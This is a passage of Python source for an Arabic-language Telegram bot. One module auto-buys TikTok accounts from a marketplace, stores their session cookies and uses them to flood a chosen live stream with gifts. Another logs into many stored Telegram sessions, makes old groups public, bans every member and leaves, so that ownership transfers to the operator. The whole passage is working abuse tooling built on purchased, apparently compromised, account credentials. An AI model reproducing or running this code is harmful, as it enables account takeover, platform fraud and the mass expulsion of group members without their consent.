            return True
        return False
    except:
        return False

# ==========================================
# ✦ لوحات المفاتيح (Keyboards) ✦
# ==========================================
def tt_main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("💸 رمي العملات على بث", callback_data="tt_throw_coins"),
        InlineKeyboardButton("🔄 فحص الحسابات", callback_data="tt_check_accs")
    )
    markup.add(
        InlineKeyboardButton("➕ إضافة حساب (JSON)", callback_data="tt_add_json"),
        InlineKeyboardButton("📂 عرض الحسابات", callback_data="tt_view_accs")
    )
    markup.add(
        InlineKeyboardButton("🛒 شــراء تـلـقـائـي", callback_data="tt_buy_menu")
    )
    markup.add(InlineKeyboardButton("🔙 رجـوع", callback_data="menu_terminate")) 
    return markup

def tt_buy_keyboard(chat_id):
    markup = InlineKeyboardMarkup(row_width=1)

    fast_text = "⚡ شـراء سـريـع (8 روبـل وأقـل | 100+ عـمـلـة)"
    custom_text = "⚙️ شـراء مـخـصـص"

    if chat_id in ACTIVE_TT_SNIPERS:
        markup.add(InlineKeyboardButton("✅ جاري الشراء... (اضغط للإيقاف)", callback_data="tt_stop_sniper"))
        return markup

    markup.add(
        InlineKeyboardButton(fast_text, callback_data="tt_buy_fast"),
        InlineKeyboardButton(custom_text, callback_data="tt_buy_custom"),
        InlineKeyboardButton("🔙 رجـوع", callback_data="tt_auto_main")
    )
    return markup

# ==========================================
# ✦ محرك البحث والشراء التلقائي (Sniper) ✦
# ==========================================
def tt_sniper_task(bot, chat_id, target_count, pmin, pmax, cmin, cmax, sniper_type):
    bought_count = 0
    stop_event = ACTIVE_TT_SNIPERS[chat_id]["stop_event"]

    t_type = "سـريـع ⚡" if sniper_type == "fast" else "مـخـصـص ⚙️"

    start_msg = (
        f"**🎯┊بـدأت عـمـلـيـة الـمـراقـبـة والـصـيـد - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
        f"⎉╎الـعـدد الـمـطـلـوب ⩥ **{target_count}**\n"
        f"⎉╎نـوع الـصـيـد ⩥ **{t_type}**"
    )
    bot.send_message(chat_id, start_msg, parse_mode="Markdown")

    while bought_count < target_count and not stop_event.is_set():
        items = lzt_search_tiktok(pmin=pmin, pmax=pmax, coins_min=cmin, coins_max=cmax)

        for item in items:
            if stop_event.is_set() or bought_count >= target_count:
                break

            item_id = item["item_id"]
            price = item["price"]

            tt_cursor.execute("SELECT item_id FROM tt_accounts WHERE item_id=?", (str(item_id),))
            if tt_cursor.fetchone(): continue

            if lzt_fast_buy(item_id, price):
                acc_data = lzt_get_account_data(item_id)
                if not acc_data: continue

                coins = acc_data.get("tt_coins", 0)
                followers = acc_data.get("tt_followers", 0)
                cookies = acc_data.get("tt_cookie_login", "لا يوجد كوكيز")
                json_dump = json.dumps(acc_data, ensure_ascii=False)

                tt_cursor.execute('''
                    INSERT INTO tt_accounts (item_id, price, coins, followers, json_data, cookies)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (str(item_id), price, coins, followers, json_dump, str(cookies)))
                tt_conn.commit()

                bought_count += 1

                hit_msg = (
                    f"**🎉┊تـم صـيـد حـسـاب بـنـجـاح - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
                    f"⎉╎الـحـالـة ⩥ **({bought_count}/{target_count})**\n"
                    f"⎉╎الـسـعـر ⩥ **{price} روبـل**\n"
                    f"⎉╎الـعـمـلات ⩥ **{coins}**\n"
                    f"⎉╎الـمـتـابـعـيـن ⩥ **{followers}**\n\n"
                    f"⎉╎الـكـوكـيـز (لـلـنـسـخ) ⩥\n`{cookies}`"
                )
                bot.send_message(chat_id, hit_msg, parse_mode="Markdown")

        time.sleep(4) 

    if chat_id in ACTIVE_TT_SNIPERS:
        del ACTIVE_TT_SNIPERS[chat_id]

    end_msg = (
        f"**🛑┊انـتـهـت عـمـلـيـة الـشـراء - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
        f"⎉╎تـم شـراء ⩥ **({bought_count})** حـسـابـات."
    )
    bot.send_message(chat_id, end_msg, parse_mode="Markdown")

# ==========================================
# ✦ محرك رمي العملات (Gifting Thread) ✦
# ==========================================
def tt_throw_coins_task(bot, chat_id, target_user, room_id):
    bot.send_message(chat_id, f"**🚀┊بـدأ هـجـوم الـعـمـلات عـلـى الـبـث - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎الـهـدف ⩥ **{target_user}**\n⎉╎جـاري دخـول الحـسـابـات وبـدء الـدعـم...", parse_mode="Markdown")

    tt_cursor.execute("SELECT item_id, cookies, coins FROM tt_accounts")
    accounts = tt_cursor.fetchall()

    total_spent_global = 0

    for acc in accounts:
        acc_id, cookies_str, db_coins = acc[0], acc[1], acc[2]
        cookies_dict = parse_cookies_to_dict(cookies_str)

        if not cookies_dict or db_coins < 20:
            continue

        current_coins = db_coins

        while current_coins >= 20:
            if current_coins >= 100:
                success = tt_send_gift(room_id, GIFT_100_COINS, cookies_dict)
                cost = 100
            else:
                success = tt_send_gift(room_id, GIFT_20_COINS, cookies_dict)
                cost = 20

            if success:
                current_coins -= cost
                total_spent_global += cost
                time.sleep(1) 
            else:
                break 

        # حفظ الرصيد الجديد
        tt_cursor.execute("UPDATE tt_accounts SET coins=? WHERE item_id=?", (current_coins, acc_id))
        tt_conn.commit()

    if chat_id in ACTIVE_TT_GIFTERS:
        del ACTIVE_TT_GIFTERS[chat_id]

    report = (
        f"**✅┊تـم الإنـتـهـاء مـن دعـم الـبـث - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
        f"⎉╎الـهـدف ⩥ **{target_user}**\n"
        f"⎉╎إجـمـالـي الـعـمـلات الـمـرسـلـة ⩥ **{total_spent_global} عـمـلـة 🪙**\n"
        f"⎉╎تـم تـحـديـث الأرصـدة فـي قـاعـدة الـبـيـانـات."
    )
    bot.send_message(chat_id, report, parse_mode="Markdown")

# ==========================================
# ✦ دوال الاستجابة (Callback Handlers) ✦
# ==========================================
def register_tiktok_handlers(bot):

    @bot.callback_query_handler(func=lambda call: call.data.startswith("tt_"))
    def tt_callbacks(call):
        chat_id = call.message.chat.id

        if call.data == "tt_auto_main":
            msg = "**🛂┊قـائـمـة تـيـك تـوك LZT - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎يـرجـى اخـتـيـار الإجـراء الـمـطـلـوب مـن الأسـفـل ⩥"
            bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=tt_main_menu(), parse_mode="Markdown")

        elif call.data == "tt_add_json":
            msg = "**🛂┊إضـافـة حـسـاب يـدويـاً (JSON) - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎يـرجـى إرسـال كـود الـ JSON الخـاص بـالـكـوكـيـز ⩥"
            sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
            bot.register_next_step_handler(sent_msg, process_add_json, bot)

        elif call.data == "tt_check_accs":
            bot.send_message(chat_id, "**🔄┊جـاري فـحـص الحـسـابـات وتـحـديـث الأرصـدة...**", parse_mode="Markdown")

            tt_cursor.execute("SELECT id, item_id, cookies FROM tt_accounts")
            accounts = tt_cursor.fetchall()

            if not accounts:
                bot.send_message(chat_id, "⚠️┊لا يـوجـد حـسـابـات فـي قـاعـدة الـبـيـانـات.")
                return

            total_global_coins = 0
            report_msg = "**🛂┊تـقـريـر الـفـحـص الـشـامـل - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"

            for acc in accounts:
                db_id, item_id, cookies_str = acc[0], acc[1], acc[2]
                cookies_dict = parse_cookies_to_dict(cookies_str)

                if cookies_dict:
                    info = tt_get_account_info(cookies_dict)
                    if info["success"]:
                        coins = info["coins"]
                        total_global_coins += coins
                        tt_cursor.execute("UPDATE tt_accounts SET coins=?, followers=? WHERE id=?", (coins, info["followers"], db_id))
                        report_msg += f"⎉╎حـسـاب `{item_id}` ⩥ **{coins}** عـمـلـة\n"
                    else:
                        report_msg += f"⎉╎حـسـاب `{item_id}` ⩥ ❌ مـحـظـور أو الكـوكـيـز مـنـتـهـي\n"

            tt_conn.commit()
            report_msg += f"\n**🪙┊إجـمـالـي الـعـمـلات المـتـوفـرة ⩥ {total_global_coins} عـمـلـة**"
            bot.send_message(chat_id, report_msg, parse_mode="Markdown")

        elif call.data == "tt_throw_coins":
            if chat_id in ACTIVE_TT_GIFTERS:
                bot.answer_callback_query(call.id, "⚠️┊هـنـاك عـمـلـيـة دعـم نـشـطـة بـالـفـعـل!", show_alert=True)
                return

            msg = "**💸┊رمـي الـعـمـلات عـلـى الـبـث - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎يـرجـى إرسـال يـوزر الشـخـص الـذي يـبـث الآن ⩥"
            sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
            bot.register_next_step_handler(sent_msg, process_target_live, bot)

        elif call.data == "tt_view_accs":
            tt_cursor.execute("SELECT item_id, coins, cookies FROM tt_accounts")
            accounts = tt_cursor.fetchall()
            if not accounts:
                bot.answer_callback_query(call.id, "⚠️┊قـاعـدة الـبـيـانـات فـارغـة!", show_alert=True)
                return
            info_msg = f"**🛂┊عـرض الحـسـابات - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n⎉╎تـم الـعـثـور عـلـى **{len(accounts)}** حـسـاب"
            bot.send_message(chat_id, info_msg, parse_mode="Markdown")
            for acc in accounts:
                bot.send_message(chat_id, f"**⎉╎رقـم الحـسـاب ⩥ {acc[0]}**\n**⎉╎عـدد الـعـمـلات ⩥ {acc[1]}**\n\n⎉╎الـكـوكـيـز ⩥\n`{acc[2]}`", parse_mode="Markdown")
                time.sleep(0.5)

        elif call.data == "tt_buy_menu":
            bot.edit_message_text("**🛒┊قـائـمـة الـشـراء الـتـلـقـائـي - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**", chat_id, call.message.message_id, reply_markup=tt_buy_keyboard(chat_id), parse_mode="Markdown")

        elif call.data == "tt_stop_sniper":
            if chat_id in ACTIVE_TT_SNIPERS:
                ACTIVE_TT_SNIPERS[chat_id]["stop_event"].set()
                bot.answer_callback_query(call.id, "🛑┊جـاري إيـقـاف الـمـراقـبـة...", show_alert=True)
                bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=tt_buy_keyboard(chat_id))

        elif call.data == "tt_buy_fast":
            if chat_id in ACTIVE_TT_SNIPERS:
                bot.answer_callback_query(call.id, "⚠️┊هـنـاك عـمـلـيـة صـيـد نـشـطـة بـالـفـعـل!", show_alert=True)
                return
            msg = (
                f"**🛒┊إعـدادات الـشـراء الـسـريـع - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
                f"⎉╎ارسـل عـدد الحـسـابات الـمـطـلـوب شـرائـهـا ⩥"
            )
            sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
            bot.register_next_step_handler(sent_msg, process_fast_buy_count, bot)

        elif call.data == "tt_buy_custom":
            if chat_id in ACTIVE_TT_SNIPERS:
                bot.answer_callback_query(call.id, "⚠️┊هـنـاك عـمـلـيـة صـيـد نـشـطـة بـالـفـعـل!", show_alert=True)
                return
            msg = (
                f"**🛒┊إعـدادات الـشـراء الـمـخـصـص - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
                f"⎉╎ارسـل الـسـعـر بـالـروبـل الـروسـي\n"
                f"⎉╎مـثـال ⩥ `0 30` (لـلـبـحـث مـن 0 إلـى 30)\n"
                f"⎉╎او `30` فـقـط (لـلـحـد الأقـصـى 30) ⩥"
            )
            sent_msg = bot.send_message(chat_id, msg, parse_mode="Markdown")
            bot.register_next_step_handler(sent_msg, process_custom_price, bot)

    # ----------------- مسارات (Steps) -----------------
    def process_add_json(message, bot):
        json_text = message.text.strip()
        chat_id = message.chat.id

        cookies_dict = parse_cookies_to_dict(json_text)
        if not cookies_dict:
            bot.send_message(chat_id, "❌┊الـكـود غـيـر صـالـح. يـرجـى الـتـأكـد مـن صـيـغـة الـ JSON.", parse_mode="Markdown")
            return

        bot.send_message(chat_id, "⏳┊جـاري تـسـجـيـل الـدخـول وجـلـب بـيـانـات الحـسـاب...")

        info = tt_get_account_info(cookies_dict)

        import random
        fake_item_id = f"MANUAL_{random.randint(10000, 99999)}"

        coins = info.get("coins", 0) if info.get("success") else 0
        followers = info.get("followers", 0) if info.get("success") else 0

        tt_cursor.execute('''
            INSERT INTO tt_accounts (item_id, price, coins, followers, json_data, cookies)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (fake_item_id, 0.0, coins, followers, "Added_Manually", json_text))
        tt_conn.commit()

        success_msg = (
            f"**✅┊تـم إضـافـة الحـسـاب لـلـقـاعـدة بـنـجـاح - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
            f"⎉╎الـمـتـابـعـيـن ⩥ **{followers}**\n"
            f"⎉╎الـعـمـلات ⩥ **{coins}** 🪙\n"
        )
        if not info.get("success"):
            success_msg += "\n⚠️┊مـلاحـظـة: لـم يـتـمـكـن الـبـوت مـن قـراءة الأرقـام بـسـبـب حـمـايـة تـيـك تـوك، ولـكـن تـم حـفـظ الحـسـاب."

        bot.send_message(chat_id, success_msg, parse_mode="Markdown")

    def process_target_live(message, bot):
        username = message.text.strip().replace("@", "")
        chat_id = message.chat.id

        bot.send_message(chat_id, "⏳┊جـاري اسـتـخـراج روم الـبـث (Room ID)...")

        room_id = tt_get_live_room_id(username)
        if not room_id:
            bot.send_message(chat_id, "❌┊عـذراً، إمـا أن الـيـوزر غـيـر صـحـيـح، أو أن الـشـخـص لا يـبـث حـالـيـاً.", parse_mode="Markdown")
            return

        ACTIVE_TT_GIFTERS[chat_id] = True

        t = threading.Thread(target=tt_throw_coins_task, args=(bot, chat_id, username, room_id))
        t.start()

    def process_fast_buy_count(message, bot):
        if not message.text.isdigit():
            bot.send_message(message.chat.id, "**❌┊عـذراً، يـجـب إرسـال أرقـام فـقـط!**", parse_mode="Markdown")
            return

        count = int(message.text)
        chat_id = message.chat.id

        stop_event = threading.Event()
        ACTIVE_TT_SNIPERS[chat_id] = {"stop_event": stop_event, "type": "fast"}

        t = threading.Thread(target=tt_sniper_task, args=(bot, chat_id, count, 0, 8, 100, None, "fast"))
        t.start()

        bot.send_message(chat_id, "**✅┊تـم تـفـعـيـل الـمـراقـبـة لـلـشـراء الـسـريـع بـنـجـاح.**", parse_mode="Markdown")

    def process_custom_price(message, bot):
        text = message.text.strip().split()
        pmin, pmax = None, None

        if len(text) == 1 and text[0].isdigit():
            pmax = int(text[0])
        elif len(text) >= 2 and text[0].isdigit() and text[1].isdigit():
            nums = sorted([int(text[0]), int(text[1])])
            pmin, pmax = nums[0], nums[1]
        else:
            bot.send_message(message.chat.id, "**❌┊إدخـال خـاطـئ، تـم الإلـغـاء.**", parse_mode="Markdown")
            return

        tt_user_states[message.chat.id] = {"pmin": pmin, "pmax": pmax}

        msg = (
            f"**🛒┊إعـدادات الـشـراء الـمـخـصـص - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
            f"⎉╎ارسـل عـدد الـعـمـلات\n"
            f"⎉╎مـثـال ⩥ `100 1000` (مـن 100 إلـى 1000)\n"
            f"⎉╎او `1000` فـقـط (لـلـحـد الأقـصـى 1000) ⩥"
        )
        sent_msg = bot.send_message(message.chat.id, msg, parse_mode="Markdown")
        bot.register_next_step_handler(sent_msg, process_custom_coins, bot)

    def process_custom_coins(message, bot):
        text = message.text.strip().split()
        cmin, cmax = None, None

        if len(text) == 1 and text[0].isdigit():
            cmax = int(text[0])
        elif len(text) >= 2 and text[0].isdigit() and text[1].isdigit():
            nums = sorted([int(text[0]), int(text[1])])
            cmin, cmax = nums[0], nums[1]
        else:
            bot.send_message(message.chat.id, "**❌┊إدخـال خـاطـئ، تـم الإلـغـاء.**", parse_mode="Markdown")
            return

        tt_user_states[message.chat.id].update({"cmin": cmin, "cmax": cmax})

        msg = (
            f"**🛒┊إعـدادات الـشـراء الـمـخـصـص - 𝙎𝙊𝙐𝙍𝘾𝞝 𝙕𝞝𝘿𝙏𝙃𝙊𝙉**\n\n"
            f"⎉╎وأخـيـراً.. ارسـل عـدد الحـسـابات الـمـطـلـوب شـرائـهـا ⩥"
        )
        sent_msg = bot.send_message(message.chat.id, msg, parse_mode="Markdown")
        bot.register_next_step_handler(sent_msg, process_custom_count, bot)

    def process_custom_count(message, bot):
        if not message.text.isdigit():
            bot.send_message(message.chat.id, "**❌┊عـذراً، يـجـب إرسـال أرقـام فـقـط!**", parse_mode="Markdown")
            return

        count = int(message.text)
        chat_id = message.chat.id
        user_data = tt_user_states.get(chat_id, {})

        stop_event = threading.Event()
        ACTIVE_TT_SNIPERS[chat_id] = {"stop_event": stop_event, "type": "custom"}

        t = threading.Thread(target=tt_sniper_task, args=(
            bot, chat_id, count, 
            user_data.get("pmin"), user_data.get("pmax"), 
            user_data.get("cmin"), user_data.get("cmax"), 
            "custom"
        ))
        t.start()

        bot.send_message(chat_id, "**✅┊تـم تـفـعـيـل الـمـراقـبـة لـلـشـراء الـمـخـصـص بـنـجـاح.**", parse_mode="Markdown")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ✦ تفعيل أوامر التيك توك ✦
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
register_tiktok_handlers(bot)




# داله جلب الكروبات 🤬 







import string
import random
import asyncio
import time
import logging
import traceback
from pyrogram import Client
from pyrogram.enums import ChatType
from pyrogram.errors import FloodWait, UserNotParticipant, RPCError

# استدعاء دوال الـ Raw API السريعة
from pyrogram.raw.functions.messages import AddChatUser
from pyrogram.raw.functions.channels import InviteToChannel, GetFullChannel
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# قاموس للتحكم بعملية المراقبة وإلغائها
ACTIVE_MONITORS = {}

# البوت الهدف الذي سيتم إضافته لإنعاش القروبات
TARGET_HELPER_BOT = "@AnimeCloudAppbot"

def generate_random_username():
    """توليد يوزر عشوائي غير مستخدم مكون من 9 أحرف"""
    letters = string.ascii_lowercase
    return random.choice(letters) + "".join(random.choice(letters + string.digits) for _ in range(8))

@bot.callback_query_handler(func=lambda call: call.data == "treasure_hunter_menu")
def treasure_hunter_menu(call):
    if not is_allowed(call.from_user.id): return
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("🌍 البحث في جـمـيـع الـحـسـابـات", callback_data="hunt_groups:all"))

    accounts = get_all_accounts(call.from_user.id)
    for acc_id, phone, name, uid, _ in accounts:
        markup.row(InlineKeyboardButton(f"🕵️ {name} | {phone}", callback_data=f"hunt_groups:{acc_id}"))

    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))

    text = (
        "🏴‍☠️ **صـائـد كـنـوز الـمـجـمـوعـات الـقـديـمـة:**\n\n"
        "⎉╎ يبحث بذكاء عن مجموعاتك عبر إضافة بوت لإنعاشها.\n"
        "⎉╎ يفحص (سجل المحادثة)، إذا ظاهر يحول عام وينقل الملكية.\n"
        "⎉╎ يستبعد القروبات اللي سجلها مخفي لتجنب تصفيرها.\n\n"
        "• إخـتـر الـحـسـاب لـبـدء الـصـيـد:"
    )
    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("hunt_groups:"))
def start_hunting(call):
    if not is_allowed(call.from_user.id): return
    target = call.data.split(":")[1]

    accounts_to_check = []
    if target == "all":
        accounts_to_check = get_all_accounts(call.from_user.id)
    else:
        acc = get_account(int(target))
        if acc:
            accounts_to_check = [(acc[0], acc[2], acc[4], acc[3], acc[5])]

    if not accounts_to_check:
        return bot.answer_callback_query(call.id, "❌ لا يوجد حسابات!", show_alert=True)

    status_msg = bot.edit_message_text("⏳ **بدء استخراج المجموعات عبر البوت الوسيط...**", call.message.chat.id, call.message.message_id)

    progress = {"done": 0, "total": len(accounts_to_check), "found": 0, "not_owned": 0}
    run_async(execute_treasure_hunt(call.from_user.id, call.message.chat.id, status_msg.message_id, accounts_to_check, progress))

async def check_groups_worker(acc_data, progress):
    acc_id, phone, name, uid, pyro_session = acc_data
    client = Client(f"hnt_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)

    found_groups = []
    try:
        await client.connect()
        logging.info(f"Started scanning account: {phone}")

        try:
            bot_peer = await client.resolve_peer(TARGET_HELPER_BOT)
        except Exception as e:
            logging.error(f"Cannot resolve target bot on {phone}: {e}")
            if client.is_connected:
                await client.disconnect()
            return []

        owned_chats = []

        try:
            async for dialog in client.get_dialogs():
                try:
                    chat = dialog.chat
                    if chat.type in [ChatType.GROUP, ChatType.SUPERGROUP, ChatType.CHANNEL]:
                        if getattr(chat, 'is_creator', False):
                            owned_chats.append(chat)
                        else:
                            progress['not_owned'] += 1
                except Exception:
                    continue
        except Exception as e:
            logging.error(f"Error reading dialogs for {phone}: {e}")

        sem_add = asyncio.Semaphore(5)

        async def process_add_bot(chat):
            async with sem_add:
                try:
                    if chat.type == ChatType.GROUP:
                        await client.invoke(AddChatUser(chat_id=abs(chat.id), user_id=bot_peer, fwd_limit=0))
                    else:
                        channel_peer = await client.resolve_peer(chat.id)
                        await client.invoke(InviteToChannel(channel=channel_peer, users=[bot_peer]))

                    year = chat.date.year if getattr(chat, 'date', None) else 2024

                    if year <= 2024:
                        progress['found'] += 1
                        return {
                            'id': chat.id,
                            'title': chat.title,
                            'year': year,
                            'client': client,
                            'phone': phone
                        }
                except FloodWait as e:
                    await asyncio.sleep(e.value)
                except Exception:
                    pass
                return None

        tasks = [process_add_bot(c) for c in owned_chats]
        results = await asyncio.gather(*tasks)

        for r in results:
            if r:
                found_groups.append(r)

    except Exception as e:
        logging.error(f"Error in check_groups_worker for {phone}: {e}")
    finally:
        progress['done'] += 1

    return found_groups

async def progress_updater(chat_id, msg_id, progress):
    while progress['done'] < progress['total']:
        text = (
            f"⏳ **جاري الفحص وإضافة البوت الوسيط لإنعاش المجموعات...**\n\n"
            f"📊 **التقدم:** {progress['done']}/{progress['total']} حساب\n"
            f"✅ **جروباتي المستهدفة (انضاف البوت):** {progress['found']}\n"
            f"🚫 **غير جروباتي (تم تجاهلها):** {progress['not_owned']}"
        )
        try:
            bot.edit_message_text(text, chat_id, msg_id)
        except Exception:
            pass
        await asyncio.sleep(2)

async def execute_treasure_hunt(admin_id, chat_id, msg_id, accounts, progress):
    try:
        updater_task = asyncio.create_task(progress_updater(chat_id, msg_id, progress))

        sem = asyncio.Semaphore(4)
        async def limited_check(acc):
            async with sem:
                return await check_groups_worker(acc, progress)

        tasks = [limited_check(acc) for acc in accounts]
        results = await asyncio.gather(*tasks)

        updater_task.cancel()

        all_old_groups = []
        for res in results:
            all_old_groups.extend(res)

        if not all_old_groups:
            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="treasure_hunter_menu"))
            text_result = (
                f"❌ **لم يتم العثور على قروبات تملكها مطابقة للشروط.**\n\n"
                f"📊 المجموعات التي أنت (عضو فيها) وتم تجاهلها للتأكيد: {progress['not_owned']}"
            )
            bot.edit_message_text(text_result, chat_id, msg_id, reply_markup=markup)
            for res in results:
                for g in res:
                    if g['client'].is_connected: await g['client'].disconnect()
            return

        report = (
            f"📊 **تـقـريـر الفـلـتـرة الأولـي:**\n\n"
            f"✅ إجمالي (جروباتي) التي صمدت وانضاف البوت لها: {len(all_old_groups)}\n"
            f"🚫 إجمالي (غير جروباتي) التي تم تجاهلها: {progress['not_owned']}\n\n"
        )
        for g in all_old_groups:
            report += f"🔹 {g['title'][:15]} | {g['phone']} | {g['year']}\n"

        bot.send_message(chat_id, report)
        bot.edit_message_text("🔥 **بدأت المرحلة الثانية: فحص (سجل المحادثة)، تحويل للعام، وطرد الأعضاء...**", chat_id, msg_id)

        golden_groups = []
        skipped_groups = []

        async def process_single_group(g):
            client = g['client']
            chat_id_target = g['id']
            username = generate_random_username()

            try:
                if not client.is_connected:
                    await client.connect()

                # الحل الجذري: نجلب الأيدي الخاص بالحساب عشان ما يطرد نفسه!
                my_info = await client.get_me()
                my_id = my_info.id

                chat_obj = await client.get_chat(chat_id_target)
                is_safe_to_convert = False

                if chat_obj.username:
                    is_safe_to_convert = True
                elif chat_obj.type == ChatType.CHANNEL:
                    is_safe_to_convert = True
                elif chat_obj.type == ChatType.SUPERGROUP:
                    peer = await client.resolve_peer(chat_id_target)
                    full_chat_req = await client.invoke(GetFullChannel(channel=peer))
                    if not full_chat_req.full_chat.hidden_prehistory:
                        is_safe_to_convert = True
                elif chat_obj.type == ChatType.GROUP:
                    is_safe_to_convert = False

                if not is_safe_to_convert:
                    return {
                        'status': 'skipped',
                        'data': {'id': chat_id_target, 'title': g['title'], 'phone': g['phone']}
                    }

                # آمن! نغيره عام
                await client.set_chat_username(chat_id_target, username)
                await asyncio.sleep(1)

                # الطرد الآمن (بدون كراش)
                async for member in client.get_chat_members(chat_id_target):
                    if member.user and member.user.id != my_id:
                        try:
                            await client.ban_chat_member(chat_id_target, member.user.id)
                        except FloodWait as e:
                            await asyncio.sleep(e.value)
                        except Exception:
                            pass 

                return {
                    'status': 'golden',
                    'data': {
                        'id': chat_id_target,
                        'username': username,
                        'title': g['title'],
                        'year': g['year'],
                        'client': client,
                        'phone': g['phone']
                    }
                }
            except Exception as e:
                logging.error(f"Error converting {g['id']}: {e}\n{traceback.format_exc()}")
                return None

        sem2 = asyncio.Semaphore(10)
        async def limited_process(g):
            async with sem2:
                return await process_single_group(g)

        phase2_tasks = [limited_process(g) for g in all_old_groups]
        phase2_results = await asyncio.gather(*phase2_tasks)

        for res in phase2_results:
            if res:
                if res['status'] == 'golden':
                    golden_groups.append(res['data'])
                else:
                    skipped_groups.append(res['data'])

        used_clients = [g['client'] for g in golden_groups]
        for res in results:
            for g in res:
                if g['client'] not in used_clients and g['client'].is_connected:
                    await g['client'].disconnect()

        if not golden_groups:
            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 رجوع", callback_data="treasure_hunter_menu"))
            final_text = f"❌ **لم يتم العثور على كنوز حقيقية.**\n\n📊 **سبب الاستبعاد:**\nإجمالي القروبات: {len(all_old_groups)}\nاستُبعدت لأن سجل المحادثة (مخفي): {len(skipped_groups)}\n(تم استبعادها لحمايتها من التصفير)."
            bot.edit_message_text(final_text, chat_id, msg_id, reply_markup=markup)
            return

        final_report = f"💎 **كـنـوز صـمـدت بـنـجـاح و تـم طـرد أعـضـائـهـا:** ({len(golden_groups)} قروبات)\n\n"
        for g in golden_groups:
            final_report += f"👑 {g['title']}\n🔗 @{g['username']} | 📅 {g['year']}\n\n"

        final_report += f"📊 **الإحصائيات النهائية:**\nإجمالي اللي انضاف لها البوت: {len(all_old_groups)}\nتم استبعادها لأن سجلها (مخفي): {len(skipped_groups)}\nالكنوز الحقيقية الصامدة: {len(golden_groups)}\n\n"
        final_report += "•❐• **أرسل الآن (يوزرك) الذي ستدخل به لهذه المجموعات للاستلام:**\n*(قم بالدخول للمجموعات من يوزرك فور إرساله)*"

        USER_STATES[admin_id] = {
            "action": "wait_for_target_user",
            "golden_groups": golden_groups
        }
        bot.send_message(chat_id, final_report)

    except Exception as e:
        logging.error(f"Fatal error: {e}")
        try:
            bot.edit_message_text(f"❌ حدث خطأ فادح أثناء الفحص.", chat_id, msg_id)
        except:
            pass

@bot.message_handler(func=lambda message: message.from_user.id in USER_STATES and USER_STATES[message.from_user.id].get("action") == "wait_for_target_user")
def handle_target_username(message):
    admin_id = message.from_user.id
    raw_text = message.text.strip()
    target_username = raw_text.replace("@", "").split("/")[-1]

    golden_groups = USER_STATES[admin_id]["golden_groups"]
    del USER_STATES[admin_id]

    bot.reply_to(message, f"✅ **تم تسجيل يوزرك (`{target_username}`).**\n\n⏳ بدأت المراقبة الآن...\nبمجرد دخولك للقروب سيقوم البوت بالمغادرة فوراً.\n\n*(لإلغاء المراقبة أرسل /start)*")

    ACTIVE_MONITORS[admin_id] = True
    run_async(monitor_and_leave(admin_id, target_username, golden_groups))

async def monitor_and_leave(admin_id, target_username, golden_groups):
    groups_to_monitor = golden_groups.copy()

    while ACTIVE_MONITORS.get(admin_id, False) and groups_to_monitor:
        for g in groups_to_monitor.copy():
            client = g['client']
            try:
                if not client.is_connected:
                    await client.connect()

                try:
                    member = await client.get_chat_member(g['id'], target_username)
                    if member:
                        await client.leave_chat(g['id'])
                        groups_to_monitor.remove(g)

                        try:
                            bot.send_message(admin_id, f"✅ **تـم تـسـلـيـم الـكـنـز!**\nغادر حساب `{g['phone']}` من قروب @{g['username']} لأنك دخلت.\nمبروك الملكية بعد 7 أيام!")
                        except Exception:
                            pass
                except UserNotParticipant:
                    pass
                except Exception:
                    pass
            except Exception:
                pass

        await asyncio.sleep(4)

    disconnected_clients = set()
    for g in golden_groups:
        client = g['client']
        if client not in disconnected_clients:
            if client.is_connected:
                try:
                    await client.disconnect()
                except:
                    pass
            disconnected_clients.add(client)

